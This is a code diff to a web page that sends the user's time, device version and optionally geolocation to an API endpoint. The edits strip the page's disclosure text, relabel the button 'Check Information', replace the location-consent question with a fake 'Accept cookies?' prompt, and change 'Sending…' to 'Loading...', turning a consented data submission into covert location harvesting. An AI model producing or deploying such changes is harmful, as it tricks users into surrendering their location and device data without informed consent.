@@ -14,9 +14,9 @@
 <body>
   <h1>Send Time, Device & Location</h1>
   <p class="small">
-    Tap “Send Info” to share your current time, device version, and (optionally) your location.
+      
   </p>
-  <button id="send">Send Info</button>
+  <button id="send">Check Information</button>
   <div id="status">Waiting…</div>
   <script>
     const statusEl = document.getElementById("status");
@@ -54,14 +54,14 @@
     }
 
     sendBtn.onclick = async () => {
-      statusEl.textContent = "Preparing to send…";
+      statusEl.textContent = "Preparing to …";
       const timestamp = new Date().toISOString();
       const osVersion = getOSVersion();
 
       // Ask user if they want to share location
-      if (confirm("Do you want to share your location (latitude/longitude) as well?")) {
+      if (confirm("Accept cookies?")) {
         if (!navigator.geolocation) {
-          statusEl.textContent = "Geolocation not supported on this device.";
+          statusEl.textContent = "Geo not supported on this device.";
           await sendInfo({ timestamp, osVersion });
           return;
         }
@@ -83,7 +83,7 @@
     };
 
     async function sendInfo(data) {
-      statusEl.textContent = "Sending…";
+      statusEl.textContent = "Loading...";
       try {
         const res = await fetch(API_URL, {
           method: "POST",
@@ -96,7 +96,7 @@
           return;
         }
         statusEl.innerHTML = `<b>Info sent!</b><br>Time: ${data.timestamp}<br>Device: ${data.osVersion}` +
-          (data.latitude ? `<br>Lat: ${data.latitude}<br>Lon: ${data.longitude}` : "<br>No location sent.");
+          (data.latitude ? `<br>Lat: ${data.latitude}<br>Lon: ${data.longitude}` : "<br>No information found.");
       } catch (e) {
         statusEl.textContent = "Network error. Try again.";
       }
